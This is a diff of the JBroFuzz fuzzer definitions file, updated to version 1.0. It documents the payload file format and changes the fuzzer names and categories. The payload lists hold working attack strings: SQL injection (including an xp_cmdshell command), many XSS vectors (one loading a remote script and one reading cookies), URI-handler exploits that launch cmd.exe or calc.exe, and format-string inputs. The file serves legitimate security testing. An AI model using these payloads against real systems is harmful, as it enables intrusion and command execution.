@@ -1,4 +1,4 @@
-# JBroFuzz Generator Definitions for version 0.8
+# JBroFuzz Generator Definitions for version 1.0
 #
 # -----------------------------------------------------------------------------
 # Pre conditions
@@ -11,51 +11,71 @@
 # A bit of (fuzzing) theory 
 # -----------------------------------------------------------------------------
 #
-# In the current version, there are two categories of generators. These are:
+# Fuzzers are clasified in the following two categories. These are:
 # 
-# -> Recursive Generators (R)
+# -> Recursive Fuzzers (R)
 #
-# Recursive generators iterate through all combinations of a set alphabet for 
-# a given length. An example of this is a HEX generator. This will attempt all 
+# Recursive fuzzers iterate through all combinations of a set alphabet for 
+# a given length. An example of this is a HEX-LOW fuzzer. This will attempt all 
 # possible HEX requests for any given length. For example, if the length was, 
-# say, 5 characters then a recursive generator would attempt all combinations 
+# say, 5 characters then a recursive fuzzer would attempt all combinations 
 # from 00000 to fffff.
 #
-# -> Replasive Generators (P)
+# -> Replacive Fuzzers (P)
 #
-# Replasive generators substitute the selected range with the value given 
-# from a given value list. An example of this is a XSS generator. This will
-# attempt to check against Cross Site Scripting attacks by substituting a 
+# Replacive fuzzers substitute the selected range with the value given 
+# from a given value list. An example of this is the XSS-XML fuzzer. This will
+# attempt to check against XML cross site scripting attacks by substituting a 
 # particular part of the request against the given value list. 
 #
 # -----------------------------------------------------------------------------
 # What JBroFuzz supports (what you change in this file and will work)
 # -----------------------------------------------------------------------------
 #
-# This version supports the alteration/addition of generators as seen below.
+# This version supports the alteration/addition of fuzzers based on the file
+# format described below.
 # 
 # -----------------------------------------------------------------------------
-# Adding a new generator (yes, you can brake JBroFuzz if you fuzz this file)
+# Adding a new Fuzzer (yes, you can brake JBroFuzz if you fuzz this file)
 # -----------------------------------------------------------------------------
 #
-# This file is loaded at runtime. To add a generator follow the syntax seen 
+# This file is loaded at runtime. To add a fuzzer follow the syntax seen 
 # below:
 #
-# R:XXX-XXX:(comment < 25 chars):SIZE
-# > Category (essentially a comment field)
-# VALUE(1)
-# VALUE(2)
-# ...
-# VALUE(SIZE)
+# C:XXX-XXX-XXX:Name:L
+# > Category1 | Category2 | ... | CategoryN
+# PAYLOAD_1
+# PAYLOAD_2
+# PAYLOAD_L
+#
+# Where:
+#
+# C : The character R or the character P : Stands for Recursive or Replacive
+# XXX-XXX-XXX : The unique fuzzer id : Examples are XSS-XML-UPP or NUM-HEX-LOW
+# Name : The name of the fuzzer : Examples are XSS XML Injection
+# L : The number of payloads contained within the fuzzer
+# Category : The category used to group fuzzers together : E.g. Buffer Overflows
+# PAYLOAD : The actual payload value
 #
 # Pre:
+#
 # First line must have 4 fields divided by ":"
-# First character must be "P" for replasive or "R" for recursive
-# XXX has to be unique and 3 letters long
-# Comment has to be less than 25 characters
-# SIZE has to be between [0-32]
-# SIZE must match the total number of lines below the generator
-# Second line (describing the category) must start with ">"
+# First character must be "P" for Replacive or "R" for recursive
+# XXX-XXX-XXX has to be unique and in batches of 3 letters long
+# Name has to be less than or equal to 25 characters
+# L has to be between [0-32]
+# The total number of payloads, one per line has to be equal to the value of L
+# Second line (describing the categories) must start with ">"
+# Categories must be separated with a "|"
+# 
+# A simple fuzzer example is:
+# 
+# R:BIO-DNA-UPP:DNA Uppercase Fuzzer:4
+# > Biology | English Characters
+# G
+# A
+# T
+# C
 #
 # -----------------------------------------------------------------------------
 # Alphabet String Expansion (so that you don't get bored of pasting)
@@ -71,11 +91,11 @@
 # Will produce a line of 100 A's
 #
 # Copyright (C) 2008 subere@uncon.org
-# Version 0.8
+# Version 1.0
 #
 
 P:INT-LOW:Integer Overflows:12
-> Exploits | Integer values 
+> Exploits | Replacive Fuzzers | Integer Overflows
 -1
 0
 0x100
@@ -90,7 +110,7 @@ P:INT-LOW:Integer Overflows:12
 0x100000
 
 P:FSE-LOW:Format String Errors:19
-> Exploits | Format String Errors
+> Exploits | Replacive Fuzzers | Format String Errors
 %s%p%x%d
 .1024d
 %.2049d
@@ -111,7 +131,7 @@ f(x)=%s x 123
 f(x)=%x x 255
 
 P:SQL-INJ:SQL Injection:12
-> Database | Injection Attacks
+> Replacive Fuzzers | SQL Injection
 a'
 ?
 ' or 1=1
@@ -125,8 +145,8 @@ x' OR full_name LIKE '%Bob%
 23 OR 1=1
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
-P:XSS-ONE:Cross Site Scripting:12
-> Cross Site Scripting
+P:XSS-ONE:Basic XSS:12
+> Cross Site Scripting | Replacive Fuzzers
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
@@ -141,7 +161,7 @@ perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 
 P:XSS-XML:XSS XML Injection:6
-> Cross Site Scripting | XML Injection
+> Cross Site Scripting | XML Injection | Replacive Fuzzers
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
 <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
@@ -149,15 +169,15 @@ P:XSS-XML:XSS XML Injection:6
 <XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
 
-P:XSS-URI:URI Cross Site Scripting:4
-> Cross Site Scripting | URI Exploits
+P:XSS-URI:URI XSS:4
+> Cross Site Scripting | URI Exploits | Replacive Fuzzers
 aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
 res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
 
 P:XSS-JSN:JSON:5
-> Cross Site Scripting | JSON
+> Cross Site Scripting | Replacive Fuzzers
 <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
 <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
 <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
@@ -165,17 +185,17 @@ P:XSS-JSN:JSON:5
 <body/â€?â€?$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
 
 P:XSS-SSI:Server Side Includes:1
-> Cross Site Scripting | SSI
+> Cross Site Scripting | Replacive Fuzzers
 <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 
 P:XSS-URL-BRK:URL Breaking:3
-> Cross Site Scripting | URL Break
+> Cross Site Scripting | Replacive Fuzzers
 http://aa"><script>alert(123)</script>
 http://aa'><script>alert(123)</script>
 http://aa<script>alert(123)</script>
 
-R:NUM-HEX-LOW:Hexadecimal Fuzz Type:16
-> Category String | Characters | Hex
+R:NUM-HEX-LOW:Hexadecimal Lowercase:16
+> Number Systems | Recursive Fuzzers
 0
 1
 2
@@ -193,8 +213,8 @@ d
 e
 f
 
-R:NUM-HEX-UPP:Hexadecimal Fuzz Type:16
-> Category String | Characters | Hex
+R:NUM-HEX-UPP:Hexadecimal Uppercase:16
+> Number Systems | Recursive Fuzzers
 0
 1
 2
@@ -212,8 +232,8 @@ D
 E
 F
 
-R:NUM-DEC:Decimal Fuzz Type:10
-> Category String | Characters | Dec
+R:NUM-DEC:Decimal Fuzzer:10
+> Number Systems | Recursive Fuzzers
 0
 1
 2
@@ -225,8 +245,8 @@ R:NUM-DEC:Decimal Fuzz Type:10
 8
 9
 
-R:NUM-OCT:Octal Fuzz Type:8
-> Category String | Characters | Octal
+R:NUM-OCT:Octal Fuzzer:8
+> Number Systems | Recursive Fuzzers
 0
 1
 2
@@ -236,8 +256,8 @@ R:NUM-OCT:Octal Fuzz Type:8
 6
 7
 
-R:NUM-BIN:Binary Fuzz Type:2
-> Category String | Characters | Binary
+R:NUM-BIN:Binary Fuzzer:2
+> Number Systems | Recursive Fuzzers
 0
 1
 
@@ -261,8 +281,8 @@ f(x)=A x 16385
 f(x)=A x 32769
 f(x)=A x 65537
 
-R:DNA-UPP:DNA Alphabet:4
-> Category Biology | Characters
+R:DNA-UPP:DNA Uppercase Fuzzer:4
+> Biology | Recursive Fuzzers
 A
 T
 C
